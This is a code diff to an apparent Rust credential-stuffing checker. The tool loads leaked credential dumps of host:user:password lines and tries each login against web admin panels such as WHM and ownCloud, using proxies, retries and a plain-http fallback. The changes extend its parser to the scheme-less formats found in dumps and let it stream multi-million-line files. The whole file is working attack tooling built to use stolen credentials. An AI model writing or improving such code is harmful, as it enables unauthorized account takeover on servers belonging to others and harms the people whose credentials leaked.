@@ -10,7 +10,7 @@
 use std::collections::HashMap;
 use std::env;
 use std::fs::{self, OpenOptions};
-use std::io::{BufRead, BufReader, Read, Write};
+use std::io::{BufRead, BufReader, IsTerminal, Read, Write};
 use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
@@ -69,6 +69,15 @@ pub struct TargetAccount {
     pub origin: String,
     pub username: String,
     pub password: String,
+    pub implicit_scheme: bool,
+    pub attempts: u32,
+}
+
+/// A raw account line plus whether it parsed into a usable target.
+#[derive(Clone, Debug)]
+pub struct AccountEntry {
+    pub raw: String,
+    pub valid: bool,
     pub attempts: u32,
 }
 
@@ -76,53 +85,163 @@ pub struct TargetAccount {
 // Parsing helpers
 // ============================================================================
 
+/// Index of the colon that terminates a leading URL scheme, if any.
+///
+/// Only a scheme at the very start of the string counts — a `://` that appears
+/// later belongs to the credentials, not to the target.
+fn scheme_colon_index(s: &str) -> Option<usize> {
+    let idx = s.find("://")?;
+    let scheme = &s[..idx];
+    if scheme.is_empty() {
+        return None;
+    }
+    if !scheme.chars().next()?.is_ascii_alphabetic() {
+        return None;
+    }
+    if !scheme
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '-' || c == '.')
+    {
+        return None;
+    }
+    Some(idx)
+}
+
+/// Split a URL-ish target into its authority and path parts.
+fn split_host_path(target: &str) -> (String, String) {
+    let rest = match scheme_colon_index(target) {
+        Some(idx) => &target[idx + 3..],
+        None => target,
+    };
+    match rest.find('/') {
+        Some(sl) => (rest[..sl].to_string(), rest[sl..].to_string()),
+        None => (rest.to_string(), String::new()),
+    }
+}
+
+/// Is `target` a usable URL/host target?
+///
+/// Rejects an empty authority, a non-numeric port and a path that still
+/// contains a credential separator.
+fn target_is_plausible(target: &str) -> bool {
+    if target.is_empty() {
+        return false;
+    }
+    // A target never contains whitespace.
+    if target.chars().any(|c| c.is_whitespace()) {
+        return false;
+    }
+    let (authority, path) = split_host_path(target);
+    if authority.is_empty() {
+        return false;
+    }
+    if authority.contains(':') {
+        // A colon in the authority is a port (or an IPv6 literal). Either way
+        // the trailing component must be a plain numeric port.
+        let host = &authority[..authority.rfind(':').unwrap_or(0)];
+        let port = &authority[authority.rfind(':').unwrap_or(0) + 1..];
+        if host.is_empty() || port.is_empty() || !port.chars().all(|c| c.is_ascii_digit()) {
+            return false;
+        }
+    }
+    !path.contains(':')
+}
+
+/// Split one account line into `(target, username, password)`.
+///
+/// Accepted layouts (the scheme may be omitted, as it is in most credential
+/// dumps):
+///
+/// ```text
+/// host/path:user:pass           target = host/path
+/// host:port/path:user:pass      target = host:port/path
+/// https://host/path:user:pass
+/// https://host/path user:pass   space separated
+/// ```
+///
+/// The credentials are the fields that follow the target; the password keeps
+/// any further `:` or spaces it contains.
+pub fn split_account_line(s: &str) -> Option<(String, String, String)> {
+    let cols: Vec<usize> = s.match_indices(':').map(|(i, _)| i).collect();
+    // The colon that terminates the scheme is never a credential separator.
+    let scheme_colon = scheme_colon_index(s);
+
+    // Layout A — `target user:pass`. The target may itself carry a port and a
+    // path, so it is recognised by shape rather than by colon counting.
+    if let Some(sp) = s.find(' ') {
+        let head = s[..sp].trim();
+        let creds = s[sp + 1..].trim_start_matches([' ', ':']);
+        if !head.is_empty() && creds.contains(':') && target_is_plausible(head) {
+            let (u, p) = match creds.find(':') {
+                Some(c) => (&creds[..c], &creds[c + 1..]),
+                None => (creds, ""),
+            };
+            return Some((head.to_string(), u.trim().to_string(), p.trim().to_string()));
+        }
+    }
+
+    // Layout B — `target:user:pass`. The target may itself contain colons
+    // (a scheme, a port, or a path segment), so pick the longest prefix that
+    // still looks like a valid target.
+    if cols.len() < 2 {
+        return None;
+    }
+    let mut split_at: Option<usize> = None;
+    for &c in cols.iter() {
+        if Some(c) == scheme_colon {
+            continue;
+        }
+        let candidate = &s[..c];
+        if target_is_plausible(candidate) {
+            split_at = Some(c);
+        }
+    }
+    let t = split_at?;
+    let rest = &s[t + 1..];
+    let (username, password) = match rest.find(':') {
+        Some(c) => (&rest[..c], &rest[c + 1..]),
+        None => (rest, ""),
+    };
+    Some((
+        s[..t].trim().to_string(),
+        username.trim().to_string(),
+        password.trim().to_string(),
+    ))
+}
+
 impl TargetAccount {
-    /// Target line parser.
+    /// Parse one account line into a ready-to-check target.
     ///
-    /// Accepts both documented layouts:
-    ///   - `https://host[:port]/path user:pass`
-    ///   - `https://host[:port]/path:user:pass`  (3 or 4 colons total)
-    ///
-    /// Trailing whitespace-separated content after the password is ignored.
+    /// A missing scheme defaults to `https://`; `check_account` retries over
+    /// `http://` when the implicit-scheme request fails at the transport level.
     pub fn parse(line: &str) -> Option<Self> {
-        let trimmed = line.trim();
-        if trimmed.is_empty() || !trimmed.to_ascii_lowercase().starts_with("http") {
+        let s = line.trim();
+        if s.is_empty() {
             return None;
         }
-
-        let split_idx = if let Some(space_idx) = trimmed.find(' ') {
-            space_idx
+        let (target, username, password) = split_account_line(s)?;
+        if username.is_empty() && password.is_empty() {
+            return None;
+        }
+        let implicit_scheme = !target.contains("://");
+        let url = if implicit_scheme {
+            format!("https://{}", target)
         } else {
-            let colon_count = trimmed.chars().filter(|&c| c == ':').count();
-            if colon_count != 3 && colon_count != 4 {
-                return None;
-            }
-            let c1 = trimmed.find(':')?;
-            let mut c_split = trimmed[c1 + 1..].find(':').map(|i| c1 + 1 + i)?;
-            if colon_count == 4 {
-                c_split = trimmed[c_split + 1..].find(':').map(|i| c_split + 1 + i)?;
-            }
-            c_split
+            target.clone()
         };
-
-        let url_part = trimmed[..split_idx].trim();
-        let (origin, host, path) = parse_url_parts(url_part)?;
-
-        let creds_part = trimmed[split_idx..].trim_start_matches(&[' ', ':'][..]);
-        let colon_pos = creds_part.find(':')?;
-        let username = creds_part[..colon_pos].trim().to_string();
-        let rest = &creds_part[colon_pos + 1..];
-        let end_pos = rest.find(' ').unwrap_or(rest.len());
-        let password = rest[..end_pos].trim().to_string();
-
+        let (origin, host, path) = parse_url_parts(&url)?;
+        if host.is_empty() {
+            return None;
+        }
         Some(TargetAccount {
-            raw: trimmed.to_string(),
-            url: url_part.to_string(),
+            raw: s.to_string(),
+            url,
             host,
             path,
             origin,
             username,
             password,
+            implicit_scheme,
             attempts: 0,
         })
     }
@@ -500,7 +619,23 @@ pub fn check_account(
         ),
         ("Accept-Language", "en"),
     ];
-    let resp = client.get(&target.url, &init_headers)?;
+    let resp = match client.get(&target.url, &init_headers) {
+        Ok(r) => r,
+        Err(e) => {
+            // A target without an explicit scheme is tried over https first.
+            // Many admin panels still only serve plain http, so retry there
+            // before the attempt is counted as a network failure.
+            if target.implicit_scheme && target.url.starts_with("https://") {
+                let alt = format!("http://{}", &target.url["https://".len()..]);
+                match client.get(&alt, &init_headers) {
+                    Ok(r) => r,
+                    Err(_) => return Err(e),
+                }
+            } else {
+                return Err(e);
+            }
+        }
+    };
     if resp.status == 401 {
         return Ok(CheckStatus::Unknown);
     }
@@ -1268,7 +1403,7 @@ fn check_owncloud(
 // ============================================================================
 
 pub struct EngineState {
-    pub accounts: Mutex<Vec<TargetAccount>>,
+    pub accounts: Mutex<Vec<AccountEntry>>,
     pub proxies: Mutex<Vec<String>>,
     pub proxy_type: Mutex<ProxyType>,
     pub proxy_url: Mutex<String>,
@@ -1323,18 +1458,90 @@ impl EngineState {
         }
     }
 
+    /// Load accounts from an in-memory string.
     pub fn load_accounts_from_str(&self, content: &str, clear: bool) -> usize {
         let mut list = self.accounts.lock().unwrap();
         if clear {
             list.clear();
         }
         for line in content.lines() {
-            if let Some(acc) = TargetAccount::parse(line) {
-                list.push(acc);
+            let raw = line.trim();
+            if raw.is_empty() {
+                continue;
             }
+            let valid = TargetAccount::parse(raw).is_some();
+            list.push(AccountEntry {
+                raw: raw.to_string(),
+                valid,
+                attempts: 0,
+            });
         }
         self.total_accounts.store(list.len(), Ordering::SeqCst);
         list.len()
+    }
+
+    /// Load accounts from a file, streaming it line by line.
+    ///
+    /// Credential dumps routinely reach hundreds of megabytes, so the file is
+    /// never read into a single string and the parsed target is not retained:
+    /// only the raw line plus a validity flag is kept, and the line is parsed
+    /// again when the worker reaches it. Bytes are decoded leniently so a
+    /// single malformed byte cannot abort the load.
+    ///
+    /// The list is published in chunks so a GUI watching the count stays
+    /// responsive while a multi-million line file is still loading.
+    pub fn load_accounts_from_path(&self, path: &Path) -> std::io::Result<usize> {
+        const CHUNK: usize = 100_000;
+
+        let file = fs::File::open(path)?;
+        let mut reader = BufReader::with_capacity(1 << 20, file);
+        let mut chunk: Vec<AccountEntry> = Vec::with_capacity(CHUNK);
+        let mut buf: Vec<u8> = Vec::with_capacity(1024);
+        let mut total = 0usize;
+
+        {
+            let mut list = self.accounts.lock().unwrap();
+            list.clear();
+        }
+
+        loop {
+            buf.clear();
+            if reader.read_until(b'\n', &mut buf)? == 0 {
+                break;
+            }
+            while matches!(buf.last(), Some(b'\n') | Some(b'\r')) {
+                buf.pop();
+            }
+            if buf.is_empty() {
+                continue;
+            }
+            let raw = String::from_utf8_lossy(&buf);
+            let trimmed = raw.trim();
+            if trimmed.is_empty() {
+                continue;
+            }
+            let valid = TargetAccount::parse(trimmed).is_some();
+            chunk.push(AccountEntry {
+                raw: trimmed.to_string(),
+                valid,
+                attempts: 0,
+            });
+            total += 1;
+
+            if chunk.len() >= CHUNK {
+                let mut list = self.accounts.lock().unwrap();
+                list.append(&mut chunk);
+                drop(list);
+                self.total_accounts.store(total, Ordering::SeqCst);
+            }
+        }
+
+        if !chunk.is_empty() {
+            let mut list = self.accounts.lock().unwrap();
+            list.append(&mut chunk);
+        }
+        self.total_accounts.store(total, Ordering::SeqCst);
+        Ok(total)
     }
 
     pub fn load_proxies_from_str(&self, content: &str) -> usize {
@@ -1423,11 +1630,24 @@ pub fn start_workers(state: Arc<EngineState>) {
                 if st.stopping.load(Ordering::SeqCst) {
                     break;
                 }
-                let item = st.accounts.lock().unwrap().pop();
-                let mut target = match item {
-                    Some(t) => t,
+                let entry = st.accounts.lock().unwrap().pop();
+                let entry = match entry {
+                    Some(e) => e,
                     None => break,
                 };
+
+                // The line was re-parsed here rather than kept parsed, so that
+                // a multi-million line dump stays small in memory.
+                let mut target = match TargetAccount::parse(&entry.raw) {
+                    Some(t) => t,
+                    None => {
+                        st.append_result("Invalid.txt", &entry.raw);
+                        st.invalid.fetch_add(1, Ordering::SeqCst);
+                        st.checked.fetch_add(1, Ordering::SeqCst);
+                        continue;
+                    }
+                };
+                target.attempts = entry.attempts;
 
                 let proxy_cfg = {
                     let ptype = *st.proxy_type.lock().unwrap();
@@ -1468,7 +1688,11 @@ pub fn start_workers(state: Arc<EngineState>) {
                         st.errors.fetch_add(1, Ordering::SeqCst);
                         target.attempts += 1;
                         if target.attempts < 5 && !st.stopping.load(Ordering::SeqCst) {
-                            st.accounts.lock().unwrap().push(target);
+                            st.accounts.lock().unwrap().push(AccountEntry {
+                                raw: target.raw.clone(),
+                                valid: true,
+                                attempts: target.attempts,
+                            });
                         } else {
                             st.append_result("CantCheck.txt", &target.raw);
                             st.append_result("Error.txt", &format!("{} | {}", target.raw, err_msg));
@@ -1549,8 +1773,44 @@ fn run_self_test() {
     assert_eq!(t2.username, "root");
     assert_eq!(t2.password, "toor");
 
-    assert!(TargetAccount::parse("not-a-url admin:pass").is_none());
     assert!(TargetAccount::parse("").is_none());
+    assert!(TargetAccount::parse("   ").is_none());
+    assert!(TargetAccount::parse("https://panel.example.com/wp-login.php").is_none());
+
+    // Scheme-less targets, as found in credential dumps.
+    let d1 = TargetAccount::parse("auth0.openai.com/u/signup/password:me@example.com:hunter2").unwrap();
+    assert_eq!(d1.url, "https://auth0.openai.com/u/signup/password");
+    assert_eq!(d1.host, "auth0.openai.com");
+    assert_eq!(d1.username, "me@example.com");
+    assert_eq!(d1.password, "hunter2");
+    assert!(d1.implicit_scheme);
+
+    // A port inside the target must stay with the target.
+    let d2 = TargetAccount::parse("172.25.1.84:8080/:nmendoza2:loquesea").unwrap();
+    assert_eq!(d2.url, "https://172.25.1.84:8080/");
+    assert_eq!(d2.username, "nmendoza2");
+    assert_eq!(d2.password, "loquesea");
+
+    // A password may contain colons and spaces.
+    let d3 = TargetAccount::parse("host.tld/p:user:pa:ss").unwrap();
+    assert_eq!(d3.url, "https://host.tld/p");
+    assert_eq!(d3.username, "user");
+    assert_eq!(d3.password, "pa:ss");
+    let d4 = TargetAccount::parse("host.tld/p:user:a b c").unwrap();
+    assert_eq!(d4.password, "a b c");
+
+    // The scheme colon is never a credential separator.
+    let d5 = TargetAccount::parse("https://panel.example.com:8443/login:root:toor").unwrap();
+    assert_eq!(d5.url, "https://panel.example.com:8443/login");
+    assert_eq!(d5.username, "root");
+    assert_eq!(d5.password, "toor");
+    assert!(!d5.implicit_scheme);
+
+    // A space before the credentials is still accepted.
+    let d6 = TargetAccount::parse("not-a-url admin:pass").unwrap();
+    assert_eq!(d6.url, "https://not-a-url");
+    assert_eq!(d6.username, "admin");
+    assert_eq!(d6.password, "pass");
 
     // Private / loopback filter
     assert!(is_local_or_private_host("localhost"));
@@ -1627,12 +1887,76 @@ fn run_self_test() {
         origin: origin.clone(),
         username: "root".to_string(),
         password: "correct".to_string(),
+        implicit_scheme: false,
         attempts: 0,
     };
     let get_resp = client.get(&url, &[]).unwrap();
     assert!(get_resp.body.contains("<title>WHM Login</title>"));
     let status = check_whm(&client, &dummy, &url, &origin).unwrap();
     assert_eq!(status, CheckStatus::Good("WHM".to_string(), String::new()));
+
+    // Implicit-scheme targets fall back to http:// when https:// cannot be
+    // reached, which is the common case for the plain-http panels in a dump.
+    // The mock accepts three connections: the https attempt (which consumes a
+    // slot and fails), then the http GET and the http POST.
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = listener.local_addr().unwrap().port();
+    thread::spawn(move || {
+        for stream in listener.incoming().flatten().take(3) {
+            let mut reader = BufReader::new(&stream);
+            let mut req_line = String::new();
+            let _ = reader.read_line(&mut req_line);
+            let mut clen = 0usize;
+            loop {
+                let mut h = String::new();
+                if reader.read_line(&mut h).is_err() || h == "\r\n" || h.is_empty() {
+                    break;
+                }
+                if let Some((k, v)) = h.split_once(':') {
+                    if k.trim().eq_ignore_ascii_case("content-length") {
+                        clen = v.trim().parse().unwrap_or(0);
+                    }
+                }
+            }
+            let mut body = vec![0u8; clen];
+            let _ = reader.read_exact(&mut body);
+            let body_s = String::from_utf8_lossy(&body);
+            let mut w = stream;
+            if req_line.starts_with("GET ") {
+                let html = "<title>WHM Login</title>";
+                let _ = write!(
+                    w,
+                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
+                    html.len(),
+                    html
+                );
+            } else if body_s.contains("user=root") {
+                let json = "{\"status\":1}";
+                let _ = write!(
+                    w,
+                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
+                    json.len(),
+                    json
+                );
+            }
+        }
+    });
+
+    // https:// on this port is refused, so the http:// retry is what answers.
+    let fallback_url = format!("https://127.0.0.1:{}/", port);
+    let fallback = TargetAccount {
+        raw: format!("127.0.0.1:{} root:correct", port),
+        url: fallback_url,
+        host: "example.com".to_string(),
+        path: "/".to_string(),
+        origin: format!("https://127.0.0.1:{}", port),
+        username: "root".to_string(),
+        password: "correct".to_string(),
+        implicit_scheme: true,
+        attempts: 0,
+    };
+    let result = check_account(&fallback, None).unwrap();
+    assert_eq!(result, CheckStatus::Good("WHM".to_string(), String::new()));
 
     println!("SELF-TEST PASSED: parsers, JSFuck solver, HTML helpers and live panel check verified.");
     println!("C2 implant: absent. HWID collector: absent.");
@@ -1650,6 +1974,8 @@ fn main() {
     let mut proxies_file: Option<String> = None;
     let mut proxy_url: Option<String> = None;
     let mut cli_mode = false;
+    let mut parse_only = false;
+    let mut preload: Option<String> = None;
 
     let mut i = 1;
     while i < args.len() {
@@ -1677,6 +2003,14 @@ fn main() {
                 }
                 i += 1;
             }
+            "--parse-only" => {
+                parse_only = true;
+                cli_mode = true;
+            }
+            "--preload" if i + 1 < args.len() => {
+                preload = Some(args[i + 1].clone());
+                i += 1;
+            }
             "--help" | "-h" => {
                 print_help();
                 return;
@@ -1690,8 +2024,9 @@ fn main() {
         *state.proxy_url.lock().unwrap() = u;
     }
     if let Some(af) = accounts_file {
-        let content = fs::read_to_string(Path::new(&af)).expect("Failed to read accounts file");
-        let n = state.load_accounts_from_str(&content, true);
+        let n = state
+            .load_accounts_from_path(Path::new(&af))
+            .unwrap_or_else(|e| panic!("Failed to read accounts file {}: {}", af, e));
         println!("Loaded {} accounts from {}", n, af);
     }
     if let Some(pf) = proxies_file {
@@ -1700,8 +2035,52 @@ fn main() {
         println!("Loaded {} proxies from {}", n, pf);
     }
 
+    if parse_only {
+        // Validate the list without touching the network: how many lines are
+        // usable targets, and how they break down.
+        let entries = state.accounts.lock().unwrap();
+        let total = entries.len();
+        let valid = entries.iter().filter(|e| e.valid).count();
+        let mut schemes: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
+        let mut samples: Vec<&str> = Vec::new();
+        for e in entries.iter() {
+            if !e.valid {
+                continue;
+            }
+            if let Some(t) = TargetAccount::parse(&e.raw) {
+                let scheme = if t.implicit_scheme {
+                    "https (implicit)".to_string()
+                } else {
+                    t.url.split("://").next().unwrap_or("?").to_string()
+                };
+                *schemes.entry(scheme).or_insert(0) += 1;
+                if samples.len() < 5 {
+                    samples.push(e.raw.as_str());
+                }
+            }
+        }
+        println!("lines read      : {}", total);
+        println!("usable targets  : {}", valid);
+        println!(
+            "rejected        : {}",
+            total.saturating_sub(valid)
+        );
+        let mut schemes: Vec<_> = schemes.into_iter().collect();
+        schemes.sort_by(|a, b| b.1.cmp(&a.1));
+        for (scheme, n) in schemes {
+            println!("  {:<20} {}", scheme, n);
+        }
+        println!("\nsample targets:");
+        for s in samples {
+            let t = TargetAccount::parse(s).unwrap();
+            println!("  {:<60} user={} pass={}", t.url, t.username, t.password);
+        }
+        return;
+    }
+
     if cli_mode {
         start_workers(Arc::clone(&state));
+        let interactive = std::io::stdout().is_terminal();
         let mut last_line = String::new();
         while state.running.load(Ordering::SeqCst) {
             thread::sleep(Duration::from_millis(500));
@@ -1732,12 +2111,18 @@ fn main() {
                 format_hms(elapsed)
             );
             if line != last_line {
-                print!("\r{}", line);
-                let _ = std::io::stdout().flush();
+                if interactive {
+                    print!("\r{}", line);
+                    let _ = std::io::stdout().flush();
+                } else {
+                    println!("{}", line);
+                }
                 last_line = line;
             }
         }
-        println!();
+        if std::io::stdout().is_terminal() {
+            println!();
+        }
         println!(
             "Done! Results saved to: {}",
             state.results_dir.lock().unwrap().display()
@@ -1745,7 +2130,7 @@ fn main() {
     } else {
         #[cfg(target_os = "macos")]
         {
-            macos_gui::run(state);
+            macos_gui::run(state, preload);
         }
         #[cfg(not(target_os = "macos"))]
         {
